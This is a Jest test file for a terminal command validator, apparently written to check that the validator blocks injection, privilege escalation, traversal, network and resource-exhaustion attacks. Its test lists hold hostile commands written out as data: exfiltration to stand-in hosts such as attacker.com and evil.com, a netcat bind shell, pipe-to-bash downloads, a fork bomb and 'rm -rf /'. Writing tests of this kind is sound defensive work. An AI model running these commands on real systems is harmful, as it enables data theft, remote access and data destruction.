import { CommandValidator } from '../src/command-validator';
import { CommandExecutor } from '../src/command-executor';
import { TerminalManager } from '../src/terminal-manager';

// Mock child_process for security testing
jest.mock('child_process', () => ({
  spawn: jest.fn(),
  exec: jest.fn(),
}));

describe('Security and Validation Tests', () => {
  let validator: CommandValidator;
  let executor: CommandExecutor;
  let mockSpawn: jest.Mock;

  beforeEach(() => {
    validator = new CommandValidator();
    executor = new CommandExecutor();
    mockSpawn = require('child_process').spawn as jest.Mock;
    
    jest.clearAllMocks();
  });

  describe('Command Injection Prevention', () => {
    it('should detect and block basic command injection attempts', () => {
      const maliciousCommands = [
        'ls; rm -rf /',
        'cat file.txt | nc attacker.com 8080',
        'echo test && curl evil.com/steal',
        'ls $(curl malicious.com/payload)',
        'find . -name "*.txt" -exec rm {} \\;',
        'git clone repo; wget evil.com/malware.sh',
      ];

      maliciousCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe(true);
        expect(result.riskLevel).toBeGreaterThan(7);
        expect(result.blockedReason).toContain('injection');
      });
    });

    it('should detect sophisticated injection patterns', () => {
      const sophisticatedInjections = [
        'ls `echo "rm -rf /"`',
        'cat /etc/passwd | base64 | curl -X POST evil.com',
        'history | grep password | mail hacker@evil.com',
        'ps aux | awk \'{print $2}\' | xargs kill -9',
        'find / -perm -4000 2>/dev/null | xargs ls -la',
        'crontab -l | sed "s/^/#/" && echo "* * * * * curl evil.com/cron" | crontab',
      ];

      sophisticatedInjections.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.isValid).toBe(false);
        expect(result.securityRisk).toBe(true);
        expect(result.riskLevel).toBe(10);
        expect(result.blockedReason).toContain('sophisticated');
      });
    });

    it('should allow legitimate command chaining', () => {
      const legitimateCommands = [
        'cd project && npm install',
        'make clean && make all',
        'git add . && git commit -m "update"',
        'mkdir -p build/dist && cp -r src/* build/',
        'echo "Building..." && webpack --mode production',
      ];

      legitimateCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.isValid).toBe(true);
        expect(result.securityRisk).toBe(false);
        expect(result.riskLevel).toBeLessThan(3);
      });
    });

    it('should validate environment variable usage', () => {
      const environmentTests = [
        { cmd: 'echo $HOME', safe: true },
        { cmd: 'echo $USER', safe: true },
        { cmd: 'echo $PATH', safe: true },
        { cmd: 'export SECRET_KEY=malicious', safe: false },
        { cmd: 'unset PATH', safe: false },
        { cmd: 'env -i malicious_command', safe: false },
      ];

      environmentTests.forEach(({ cmd, safe }) => {
        const result = validator.validateCommand(cmd);
        
        if (safe) {
          expect(result.isValid).toBe(true);
          expect(result.securityRisk).toBe(false);
        } else {
          expect(result.isValid).toBe(false);
          expect(result.securityRisk).toBe(true);
        }
      });
    });
  });

  describe('Privilege Escalation Prevention', () => {
    it('should detect and flag privilege escalation attempts', () => {
      const privilegeEscalationCommands = [
        'sudo rm -rf /',
        'su root -c "dangerous command"',
        'chmod +s /bin/bash',
        'chown root:root malicious_script.sh',
        'visudo',
        'pkexec malicious_command',
      ];

      privilegeEscalationCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.requiresElevation).toBe(true);
        expect(result.securityRisk).toBe(true);
        expect(result.riskLevel).toBeGreaterThan(8);
      });
    });

    it('should allow legitimate administrative tasks with warnings', () => {
      const legitimateAdminCommands = [
        'sudo apt update',
        'sudo systemctl restart apache2',
        'sudo chown user:user file.txt',
        'sudo chmod 644 config.conf',
      ];

      legitimateAdminCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.requiresElevation).toBe(true);
        expect(result.isValid).toBe(true);
        expect(result.warnings).toBeDefined();
        expect(result.warnings!.length).toBeGreaterThan(0);
      });
    });

    it('should implement privilege confirmation workflow', () => {
      const adminCommand = 'sudo systemctl restart nginx';
      const result = validator.validateCommand(adminCommand);
      
      expect(result.requiresElevation).toBe(true);
      expect(result.confirmationRequired).toBe(true);
      expect(result.confirmationMessage).toContain('administrative privileges');
    });
  });

  describe('File System Security', () => {
    it('should protect critical system files', () => {
      const criticalFilePaths = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/sudoers',
        '/boot/*',
        '/proc/sys/kernel/*',
        'C:\\Windows\\System32\\config\\*',
        'C:\\Windows\\System32\\drivers\\*',
      ];

      criticalFilePaths.forEach(path => {
        const commands = [
          `rm -rf ${path}`,
          `chmod 777 ${path}`,
          `mv ${path} /tmp/`,
          `cp ${path} /tmp/backup`,
        ];

        commands.forEach(cmd => {
          const result = validator.validateCommand(cmd);
          
          expect(result.isValid).toBe(false);
          expect(result.securityRisk).toBe(true);
          expect(result.blockedReason).toContain('critical system file');
        });
      });
    });

    it('should validate file permissions and ownership changes', () => {
      const permissionTests = [
        { cmd: 'chmod 644 my_file.txt', safe: true },
        { cmd: 'chmod 777 /etc/passwd', safe: false },
        { cmd: 'chown user:user my_file.txt', safe: true },
        { cmd: 'chown root:root /usr/bin/sudo', safe: false },
        { cmd: 'chmod +x script.sh', safe: true },
        { cmd: 'chmod +s /bin/bash', safe: false },
      ];

      permissionTests.forEach(({ cmd, safe }) => {
        const result = validator.validateCommand(cmd);
        
        if (safe) {
          expect(result.isValid).toBe(true);
          expect(result.securityRisk).toBe(false);
        } else {
          expect(result.isValid).toBe(false);
          expect(result.securityRisk).toBe(true);
          expect(result.riskLevel).toBeGreaterThan(7);
        }
      });
    });

    it('should detect directory traversal attempts', () => {
      const traversalAttempts = [
        'cat ../../../../etc/passwd',
        'ls ../../../.ssh/id_rsa',
        'cd ../../../../../../root',
        'find ../../../../ -name "*.key"',
        'cp file.txt ../../../tmp/',
      ];

      traversalAttempts.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.securityRisk).toBe(true);
        expect(result.blockedReason).toContain('traversal');
        expect(result.riskLevel).toBeGreaterThan(6);
      });
    });
  });

  describe('Network Security', () => {
    it('should detect and flag suspicious network operations', () => {
      const suspiciousNetworkCommands = [
        'nc -l -p 8080 -e /bin/bash',
        'wget http://malicious.com/payload.sh | bash',
        'curl evil.com/steal | sh -',
        'python -m SimpleHTTPServer 8080 &',
        'nmap -sS target.com',
        'telnet backdoor.evil.com 6666',
      ];

      suspiciousNetworkCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.securityRisk).toBe(true);
        expect(result.networkActivity).toBe(true);
        expect(result.riskLevel).toBeGreaterThan(7);
      });
    });

    it('should allow legitimate network operations with warnings', () => {
      const legitimateNetworkCommands = [
        'curl https://api.github.com/user',
        'wget https://releases.ubuntu.com/focal/ubuntu-20.04.iso',
        'ping google.com',
        'ssh user@server.com',
        'scp file.txt user@server:~/backup/',
      ];

      legitimateNetworkCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.isValid).toBe(true);
        expect(result.networkActivity).toBe(true);
        expect(result.warnings).toBeDefined();
        expect(result.riskLevel).toBeLessThan(5);
      });
    });

    it('should validate URLs and domains', () => {
      const urlTests = [
        { url: 'https://github.com', safe: true },
        { url: 'http://localhost:3000', safe: true },
        { url: 'ftp://files.example.com', safe: true },
        { url: 'http://malicious-domain.evil', safe: false },
        { url: 'https://phishing-site.com', safe: false },
      ];

      urlTests.forEach(({ url, safe }) => {
        const cmd = `curl ${url}`;
        const result = validator.validateCommand(cmd);
        
        if (safe) {
          expect(result.isValid).toBe(true);
          expect(result.riskLevel).toBeLessThan(4);
        } else {
          // This would require actual domain reputation checking
          // For now, we'll just verify the structure is there
          expect(result.networkActivity).toBe(true);
        }
      });
    });
  });

  describe('Process and Resource Security', () => {
    it('should prevent resource exhaustion attacks', () => {
      const resourceExhaustionCommands = [
        'yes > /dev/null &',
        'fork(){ fork|fork& };fork',
        'dd if=/dev/zero of=/dev/null &',
        'while true; do echo "spam"; done',
        'find / -exec echo {} \\; 2>/dev/null',
      ];

      resourceExhaustionCommands.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.securityRisk).toBe(true);
        expect(result.resourceIntensive).toBe(true);
        expect(result.riskLevel).toBeGreaterThan(8);
        expect(result.blockedReason).toContain('resource exhaustion');
      });
    });

    it('should limit process spawning and memory usage', async () => {
      const memoryIntensiveProcess = {
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        on: jest.fn((event, callback) => {
          if (event === 'close') callback(0);
        }),
        kill: jest.fn(),
      };

      mockSpawn.mockReturnValue(memoryIntensiveProcess);

      const terminalManager = new TerminalManager({
        maxConcurrentCommands: 2,
        memoryThreshold: 100 * 1024 * 1024, // 100MB
        processTimeout: 5000,
      });

      terminalManager.start();

      // Try to execute multiple memory-intensive commands
      const commands: any[] = [];
      for (let i = 0; i < 5; i++) {
        const block = terminalManager.executeCommand('memory-intensive-command');
        commands.push(block);
      }

      await new Promise(resolve => setTimeout(resolve, 50));

      // Should respect concurrency limit
      expect(mockSpawn).toHaveBeenCalledTimes(2);

      await terminalManager.destroy();
    });

    it('should monitor and kill runaway processes', async () => {
      const runawayProcess = {
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        on: jest.fn(), // Never calls close
        kill: jest.fn(),
      };

      mockSpawn.mockReturnValue(runawayProcess);

      const shortTimeoutExecutor = new CommandExecutor({ timeout: 100 });
      const startTime = Date.now();
      
      await shortTimeoutExecutor.executeCommand('infinite-loop');
      
      const endTime = Date.now();
      
      expect(endTime - startTime).toBeGreaterThan(100);
      expect(runawayProcess.kill).toHaveBeenCalled();
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize special characters in commands', () => {
      const specialCharacterTests = [
        { input: 'echo "hello; rm -rf /"', sanitized: 'echo "hello; rm -rf /"', safe: false },
        { input: 'ls | grep test', sanitized: 'ls | grep test', safe: true },
        { input: 'cat file & rm file', sanitized: 'cat file & rm file', safe: false },
        { input: 'echo $(malicious)', sanitized: 'echo $(malicious)', safe: false },
        { input: 'find . -name "*.txt"', sanitized: 'find . -name "*.txt"', safe: true },
      ];

      specialCharacterTests.forEach(({ input, safe }) => {
        const result = validator.validateCommand(input);
        
        if (safe) {
          expect(result.isValid).toBe(true);
          expect(result.securityRisk).toBe(false);
        } else {
          expect(result.isValid).toBe(false);
          expect(result.securityRisk).toBe(true);
        }
      });
    });

    it('should handle Unicode and encoding attacks', () => {
      const encodingAttacks = [
        'echo "\u0000malicious"',
        'ls -la \x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64',
        'cat \u002E\u002E\u002F\u002E\u002E\u002Fetc\u002Fpasswd',
        'rm \uFF0E\uFF0E\uFF0Ftmp\uFF0Fimportant',
      ];

      encodingAttacks.forEach(cmd => {
        const result = validator.validateCommand(cmd);
        
        expect(result.securityRisk).toBe(true);
        expect(result.blockedReason).toContain('encoding attack');
      });
    });

    it('should validate command length and complexity', () => {
      // Extremely long command (potential buffer overflow)
      const longCommand = 'echo ' + 'A'.repeat(10000);
      const longResult = validator.validateCommand(longCommand);
      
      expect(longResult.isValid).toBe(false);
      expect(longResult.blockedReason).toContain('length');

      // Extremely complex nested command
      const complexCommand = 'a'.repeat(100) + '$(b'.repeat(50) + 'c'.repeat(50) + ')'.repeat(50);
      const complexResult = validator.validateCommand(complexCommand);
      
      expect(complexResult.isValid).toBe(false);
      expect(complexResult.blockedReason).toContain('complexity');
    });
  });

  describe('Audit and Logging', () => {
    it('should log all security-related events', () => {
      const securityEvents: any[] = [];
      
      validator.on('securityEvent', (event) => {
        securityEvents.push(event);
      });

      const maliciousCommand = 'rm -rf /';
      validator.validateCommand(maliciousCommand);

      expect(securityEvents).toHaveLength(1);
      expect(securityEvents[0]).toMatchObject({
        type: 'command_blocked',
        command: maliciousCommand,
        reason: expect.stringContaining('dangerous'),
        timestamp: expect.any(Date),
        riskLevel: 10,
      });
    });

    it('should maintain command history with security annotations', () => {
      const commands = [
        'ls -la',           // Safe
        'sudo apt update',  // Privileged
        'rm -rf /',        // Dangerous (blocked)
        'cat /etc/passwd', // Security risk
      ];

      const history: any[] = [];
      
      commands.forEach((cmd, index) => {
        const result = validator.validateCommand(cmd);
        history.push({
          id: index,
          command: cmd,
          result,
          timestamp: new Date(),
        });
      });

      expect(history).toHaveLength(4);
      expect(history[0].result.securityRisk).toBe(false);
      expect(history[1].result.requiresElevation).toBe(true);
      expect(history[2].result.isValid).toBe(false);
      expect(history[3].result.securityRisk).toBe(true);
    });

    it('should provide security metrics and reports', () => {
      const testCommands = [
        { cmd: 'ls', safe: true },
        { cmd: 'rm -rf /', safe: false },
        { cmd: 'curl evil.com', safe: false },
        { cmd: 'sudo apt update', safe: true, privileged: true },
        { cmd: 'cat /etc/passwd', safe: false },
      ];

      const metrics = {
        totalCommands: 0,
        blockedCommands: 0,
        privilegedCommands: 0,
        networkCommands: 0,
        riskDistribution: { low: 0, medium: 0, high: 0 },
      };

      testCommands.forEach(({ cmd, safe, privileged }) => {
        const result = validator.validateCommand(cmd);
        metrics.totalCommands++;
        
        if (!result.isValid) metrics.blockedCommands++;
        if (result.requiresElevation) metrics.privilegedCommands++;
        if (result.networkActivity) metrics.networkCommands++;
        
        if (result.riskLevel <= 3) metrics.riskDistribution.low++;
        else if (result.riskLevel <= 7) metrics.riskDistribution.medium++;
        else metrics.riskDistribution.high++;
      });

      expect(metrics.totalCommands).toBe(5);
      expect(metrics.blockedCommands).toBe(3);
      expect(metrics.privilegedCommands).toBe(1);
      expect(metrics.riskDistribution.high).toBe(3);
    });
  });

  describe('Security Configuration', () => {
    it('should support different security levels', () => {
      const securityLevels = ['strict', 'balanced', 'permissive'];
      const testCommand = 'curl http://example.com | bash';

      securityLevels.forEach(level => {
        const levelValidator = new CommandValidator({ securityLevel: level });
        const result = levelValidator.validateCommand(testCommand);

        switch (level) {
          case 'strict':
            expect(result.isValid).toBe(false);
            break;
          case 'balanced':
            expect(result.isValid).toBe(false);
            expect(result.warnings).toBeDefined();
            break;
          case 'permissive':
            expect(result.warnings).toBeDefined();
            break;
        }
      });
    });

    it('should allow security policy customization', () => {
      const customPolicy = {
        allowNetworkCommands: false,
        allowPrivilegedCommands: false,
        blockedCommands: ['rm', 'dd', 'format'],
        allowedDomains: ['github.com', 'npmjs.com'],
        maxCommandLength: 200,
      };

      const customValidator = new CommandValidator({ policy: customPolicy });

      // Should block network commands
      const networkResult = customValidator.validateCommand('curl github.com');
      expect(networkResult.isValid).toBe(false);

      // Should block privileged commands
      const privilegedResult = customValidator.validateCommand('sudo ls');
      expect(privilegedResult.isValid).toBe(false);

      // Should block specific commands
      const blockedResult = customValidator.validateCommand('rm file.txt');
      expect(blockedResult.isValid).toBe(false);

      // Should respect length limits
      const longCommand = 'echo ' + 'A'.repeat(300);
      const lengthResult = customValidator.validateCommand(longCommand);
      expect(lengthResult.isValid).toBe(false);
    });

    it('should support whitelist and blacklist modes', () => {
      // Whitelist mode - only allow specific commands
      const whitelistValidator = new CommandValidator({
        mode: 'whitelist',
        allowedCommands: ['ls', 'cd', 'pwd', 'echo'],
      });

      expect(whitelistValidator.validateCommand('ls -la').isValid).toBe(true);
      expect(whitelistValidator.validateCommand('rm file').isValid).toBe(false);

      // Blacklist mode - block specific commands
      const blacklistValidator = new CommandValidator({
        mode: 'blacklist',
        blockedCommands: ['rm', 'format', 'del'],
      });

      expect(blacklistValidator.validateCommand('ls -la').isValid).toBe(true);
      expect(blacklistValidator.validateCommand('rm file').isValid).toBe(false);
    });
  });
});